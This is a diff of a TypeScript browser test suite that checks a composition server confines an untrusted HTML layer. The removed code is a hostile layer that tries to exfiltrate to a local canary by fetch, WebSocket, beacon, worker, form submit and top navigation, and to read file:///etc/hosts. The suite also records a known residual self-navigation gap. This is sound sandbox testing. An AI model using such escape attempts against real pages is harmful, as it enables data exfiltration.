@@ -8,7 +8,7 @@
  * navigation) and to touch the parent documents: the canary must see nothing, and the page must stay intact.
  * Skipped with a message when no Chrome is found, unless MS_REQUIRE_CHROME=1 (CI), which turns the skip into a failure.
  */
-import { mkdtempSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
+import { mkdtempSync, readFileSync, rmSync } from 'node:fs';
 import { createServer, type Server } from 'node:http';
 import { createRequire } from 'node:module';
 import { tmpdir } from 'node:os';
@@ -17,16 +17,17 @@ import { pathToFileURL } from 'node:url';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import { runtimeBuildOptions } from '../../composition-runtime/tsup.config.ts';
 import { findChrome, launchChrome, type Browser, type Page } from '../../composition-runtime/test/support/chrome.ts';
-import { COMP_PATH, findFfmpeg, H, LAYER, W, writeFixture } from '../../composition-runtime/test/support/fixture.ts';
-import { decodePng, type Image } from '../../composition-runtime/test/support/png.ts';
+import { COMP_PATH, findFfmpeg, H, LAYER, VIDEO, W, writeFixture } from '../../composition-runtime/test/support/fixture.ts';
+import { decodePng, meanGrey, type Image } from '../../composition-runtime/test/support/png.ts';
+import { sourceFrameIndex, videoSourceTime } from '../../composition-runtime/src/timing.ts';
+import { HOSTILE_BOX as HOSTILE, hostileTrack, SELF_NAVIGATION_CASES, selfNavigationPath, selfNavigationTrack, writeHostileLayers } from './helpers/hostile-layers.ts';
 import { startCompositionServer, type CompositionServer } from '../src/compositions/composition-server.ts';
 
 const chrome = findChrome();
+const ffmpeg = findFfmpeg();
 const required = process.env.MS_REQUIRE_CHROME === '1';
 const RUNTIME_PKG = join(import.meta.dirname, '../../composition-runtime');
 const FONT = join(RUNTIME_PKG, 'test/fixtures/fonts/jetbrains-mono-latin-400-normal.woff2');
-/** The hostile clip's box, on top of everything. */
-const HOSTILE = { x: 280, y: 140, width: 40, height: 40 };
 
 if (!chrome) {
   if (required) {
@@ -35,37 +36,10 @@ if (!chrome) {
     console.warn('[core] composition server Chrome tests SKIPPED: no system Chrome found (set CHROME_PATH). They are required on CI (MS_REQUIRE_CHROME=1).');
   }
 }
-
-/** A layer that tries every way out it can think of. It paints itself red when a synchronous attempt did not throw. */
-const hostileLayer = (canary: string) => `<!doctype html>
-<html><head><meta charset="utf-8">
-<style>html,body{margin:0;width:100%;height:100%;background:#00ff00;overflow:hidden}img,form{position:absolute;left:-1000px;top:0}</style>
-<link rel="stylesheet" href="${canary}/css">
-</head><body>
-<img src="${canary}/img"><img src="file:///etc/hosts">
-<form id="f" action="${canary}/form" method="post"><input name="a" value="b"></form>
-<script>
-  const C = ${JSON.stringify(canary)};
-  let escaped = false;
-  const attempt = (f) => { try { f(); escaped = true; } catch (e) { /* refused */ } };
-  attempt(() => { if (!window.top.document.body) throw 0; });
-  attempt(() => { if (!window.parent.document.body) throw 0; });
-  attempt(() => { if (typeof window.top.location.href !== 'string') throw 0; });
-  attempt(() => history.pushState({}, '', C + '/push'));
-  attempt(() => { if (!window.open(C + '/popup')) throw 0; });
-  fetch(C + '/fetch').catch(() => {});
-  fetch(C + '/fetch-no-cors', { mode: 'no-cors' }).catch(() => {});
-  try { new WebSocket(C.replace('http:', 'ws:') + '/ws'); } catch (e) {}
-  try { new EventSource(C + '/es'); } catch (e) {}
-  try { navigator.sendBeacon(C + '/beacon', 'x'); } catch (e) {}
-  try { new Worker(C + '/worker.js'); } catch (e) {}
-  import(C + '/mod.js').catch(() => {});
-  const s = document.createElement('script'); s.src = C + '/script.js'; document.head.appendChild(s);
-  try { document.getElementById('f').submit(); } catch (e) {}
-  try { window.top.location = C + '/nav'; } catch (e) {}
-  if (escaped) document.body.style.background = '#ff0000';
-  window.msReady = Promise.resolve();
-</script></body></html>`;
+if (chrome && !ffmpeg) {
+  if (required) it('ffmpeg is required for the video checks (MS_REQUIRE_CHROME=1): set FFMPEG_PATH', () => { throw new Error('no ffmpeg found'); });
+  else console.warn('[core] composition server Chrome tests: no ffmpeg, the video checks are SKIPPED.');
+}
 
 describe.skipIf(!chrome)('composition server in headless Chrome', () => {
   let work: string;
@@ -85,16 +59,14 @@ describe.skipIf(!chrome)('composition server in headless Chrome', () => {
     const { build } = await import(pathToFileURL(createRequire(join(RUNTIME_PKG, 'package.json')).resolve('tsup')).href) as { build(o: unknown): Promise<void> };
     await build({ ...runtimeBuildOptions(dist), config: false });
     site = join(work, 'site');
-    writeFixture(site, FONT, findFfmpeg());
+    writeFixture(site, FONT, ffmpeg);
     canary = createServer((req, res) => { canaryHits.push(req.url ?? ''); res.writeHead(204); res.end(); });
     canary.on('upgrade', (req, socket) => { canaryHits.push(`upgrade ${req.url ?? ''}`); socket.destroy(); });
     await new Promise<void>((r) => canary.listen(0, '127.0.0.1', () => r()));
     canaryOrigin = `http://127.0.0.1:${(canary.address() as { port: number }).port}`;
-    writeFileSync(join(site, COMP_PATH, 'layers', 'hostile.html'), hostileLayer(canaryOrigin));
+    writeHostileLayers(join(site, COMP_PATH), canaryOrigin);
     composition = JSON.parse(readFileSync(join(site, COMP_PATH, 'composition.json'), 'utf8')) as Record<string, unknown>;
-    (composition.tracks as unknown[]).push({ id: 'hostile', kind: 'visual', clips: [
-      { id: 'hostile', type: 'html', src: 'layers/hostile.html', start: 0, duration: 4, props: HOSTILE },
-    ] });
+    (composition.tracks as unknown[]).push(hostileTrack());
     browser = await launchChrome(chrome!);
   }, 240_000);
 
@@ -114,6 +86,14 @@ describe.skipIf(!chrome)('composition server in headless Chrome', () => {
     while (x < W && (() => { const [r, g, b] = img.px(LAYER.x + x, LAYER.y + 10); return r > 128 && g < 100 && b < 100; })()) x++;
     return x;
   };
+  /** The source frame number the fixture video codes in two grey blocks (as in the runtime test). */
+  const videoFrame = (img: Image) => {
+    const digit = (x: number) => Math.round((meanGrey(img, x, VIDEO.y + VIDEO.height / 2) * 219) / 255 / 20);
+    return digit(VIDEO.x + (VIDEO.width * 3) / 4) * 10 + digit(VIDEO.x + VIDEO.width / 4);
+  };
+  const expectedFrame = (t: number) => sourceFrameIndex(videoSourceTime(VIDEO, t), VIDEO.sourceFps);
+  const log: Array<{ method: string; path: string; status: number }> = [];
+  const onResponse = (e: { method: string; path: string; status: number }) => { log.push(e); };
   const poll = (page: Page, expr: string) => page.eval(`new Promise((res, rej) => { const t0 = Date.now(); (function poll() {
     const v = (${expr}); if (v) return res(v); if (Date.now() - t0 > 180000) return rej(new Error('timeout')); setTimeout(poll, 50); })(); })`, 200_000);
   /** A stub UI page on its own origin, embedding a sandboxed iframe and recording the messages from it. */
@@ -129,7 +109,7 @@ describe.skipIf(!chrome)('composition server in headless Chrome', () => {
   }
 
   it('render: the page loads top-level, fonts and layers work, the hostile layer reaches nothing', async () => {
-    const server: CompositionServer = await startCompositionServer({ uiOrigins: [], distDir: dist });
+    const server: CompositionServer = await startCompositionServer({ uiOrigins: [], distDir: dist, onResponse });
     const page = await browser.newPage(W, H);
     try {
       const s = await server.mintSession({ creativeDir: site, versionDir, format, composition, mode: 'render' });
@@ -141,6 +121,11 @@ describe.skipIf(!chrome)('composition server in headless Chrome', () => {
       const img = decodePng(await page.screenshot());
       expect(barWidth(img)).toBe(75);
       expect(isGreen(px(img, HOSTILE.x + 20, HOSTILE.y + 20))).toBe(true);
+      if (ffmpeg) {
+        expect(videoFrame(img)).toBe(expectedFrame(1.5));
+        // Chrome fetched the video with byte ranges and got 206 (video seeking needs them).
+        expect(log.some((e) => e.path.endsWith('/assets/frames24.mp4') && e.status === 206)).toBe(true);
+      }
       expect(await page.eval('location.href')).toBe(s.url);
     } finally {
       await page.close();
@@ -151,7 +136,7 @@ describe.skipIf(!chrome)('composition server in headless Chrome', () => {
   it('preview: a sandboxed iframe of the UI origin gets ready with fonts and layers; a foreign origin cannot frame it', async () => {
     const ui = await stubUi();
     const foreign = await stubUi();
-    const server = await startCompositionServer({ uiOrigins: () => [ui], distDir: dist });
+    const server = await startCompositionServer({ uiOrigins: () => [ui], distDir: dist, onResponse });
     try {
       const s = await server.mintSession({ creativeDir: site, versionDir, format, composition, mode: 'preview', parentOrigin: ui });
       const page = await browser.newPage(W, H);
@@ -166,6 +151,7 @@ describe.skipIf(!chrome)('composition server in headless Chrome', () => {
       const img = decodePng(await page.screenshot());
       expect(barWidth(img)).toBe(75);
       expect(isGreen(px(img, HOSTILE.x + 20, HOSTILE.y + 20))).toBe(true);
+      if (ffmpeg) expect(videoFrame(img)).toBe(expectedFrame(1.5));
       expect(await page.eval('location.href')).toBe(`${ui}/`);
       await page.close();
 
@@ -192,5 +178,70 @@ describe.skipIf(!chrome)('composition server in headless Chrome', () => {
       await page.eval(`fetch(${JSON.stringify(`${canaryOrigin}/control`)}, { mode: 'no-cors' }).then(() => true, () => false)`);
       expect(canaryHits).toEqual(['/control']);
     } finally { await page.close(); }
+  }, 120_000);
+
+  /*
+   * Self-navigation (Task 3 review). A layer can navigate ITS OWN frame: location.href, a meta refresh, an anchor click, or
+   * a nested iframe. Neither the layer's CSP nor the iframe sandbox stops a frame from navigating itself. What does stop it
+   * is the CSP of the EMBEDDING document: the runtime page's `default-src 'self'` is its `frame-src`, and Chrome checks
+   * every navigation of a child frame against it, including one the child starts itself. The nested iframe is also
+   * refused by the layer's own `frame-src`. So through the runtime page, in render and in preview, nothing reaches the
+   * canary. This test pins that, so a later `frame-src` relaxation fails here.
+   * Defence in depth (orchestrator decision): Task 4 adds CDP request interception in render and Task 7 a webRequest
+   * filter in the desktop preview. Both reuse helpers/hostile-layers.ts and assert the same silence.
+   */
+  it('self-navigation of a layer is blocked by the runtime page (frame-src), in preview and in render', async () => {
+    const ui = await stubUi();
+    const server = await startCompositionServer({ uiOrigins: [ui], distDir: dist });
+    const selfnav = { ...composition, tracks: [selfNavigationTrack()] };
+    const before = canaryHits.length;
+    try {
+      const prev = await server.mintSession({ creativeDir: site, versionDir, format, composition: selfnav, mode: 'preview', parentOrigin: ui });
+      const page = await browser.newPage(W, H);
+      await page.goto(`${ui}/`);
+      await page.eval(`document.getElementById('f').src = ${JSON.stringify(prev.url)}; true`);
+      const render = await server.mintSession({ creativeDir: site, versionDir, format, composition: selfnav, mode: 'render' });
+      const top = await browser.newPage(W, H);
+      await top.goto(render.url);
+      // The layers load at once and each one navigates within a second (meta refresh 0, a script, a click).
+      await new Promise((r) => setTimeout(r, 6000));
+      expect(canaryHits.slice(before)).toEqual([]);
+      expect(await page.eval('location.href')).toBe(`${ui}/`);
+      expect(await top.eval('location.href')).toBe(render.url);
+      await page.close();
+      await top.close();
+    } finally {
+      await server.close();
+    }
+  }, 120_000);
+
+  /*
+   * KNOWN RESIDUAL. A layer URL framed DIRECTLY by a page without our CSP, not through the runtime page, can navigate
+   * itself to the canary with location.href, a meta refresh or an anchor click. Its nested iframe stays blocked by the
+   * layer's own CSP. Such a page needs the session token, and the UI never frames a layer directly. The headers alone
+   * cannot close this. Task 4 (CDP interception) and Task 7 (webRequest filter) close it where they own the browser. The
+   * web preview in the user's browser keeps it (documented; layers load only when the user starts the preview). If this
+   * starts failing because the canary is no longer reached, flip it.
+   */
+  it('KNOWN RESIDUAL: a layer framed directly by a page without our CSP navigates itself to the canary (closed in Tasks 4 and 7)', async () => {
+    const ui = await stubUi();
+    const server = await startCompositionServer({ uiOrigins: [ui], distDir: dist });
+    const page = await browser.newPage(W, H);
+    try {
+      const s = await server.mintSession({ creativeDir: site, versionDir, format, composition, mode: 'preview', parentOrigin: ui });
+      const frames = SELF_NAVIGATION_CASES.map((c) => `${server.origin}/${s.token}/${versionDir}/compositions/${format}/layers/selfnav-${c}.html`);
+      await page.goto(`${ui}/`);
+      await page.eval(`for (const src of ${JSON.stringify(frames)}) { const f = document.createElement('iframe'); f.sandbox = 'allow-scripts'; f.src = src; document.body.appendChild(f); } true`);
+      const reached = ['href', 'meta', 'anchor'].map((c) => selfNavigationPath(c as 'href'));
+      const t0 = Date.now();
+      while (!reached.every((p) => canaryHits.includes(p)) && Date.now() - t0 < 30_000) await new Promise((r) => setTimeout(r, 100));
+      await new Promise((r) => setTimeout(r, 1000));
+      expect(canaryHits.filter((p) => p.startsWith('/selfnav-')).sort()).toEqual([...reached].sort());
+      expect(canaryHits).not.toContain(selfNavigationPath('iframe'));
+      expect(await page.eval('location.href')).toBe(`${ui}/`);
+    } finally {
+      await page.close();
+      await server.close();
+    }
   }, 120_000);
 });
